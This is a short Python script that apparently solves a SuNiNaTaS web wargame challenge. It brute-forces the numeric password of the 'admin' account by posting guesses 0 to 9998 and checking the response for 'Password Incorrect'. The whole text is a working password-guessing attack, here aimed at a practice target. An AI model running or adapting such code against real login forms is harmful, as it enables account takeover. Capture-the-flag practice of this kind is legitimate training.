import requests
for i in range(9999):
    url = "http://suninatas.com/challenge/web08/web08.asp"
    seq = requests.Request(url)
    data={
        'id':'admin',
        'pw':i
    }
    response=requests.post(url,data=data)
    if response.text.find('Password Incorrect') == 1828:
        pass
    else:
        print(i)
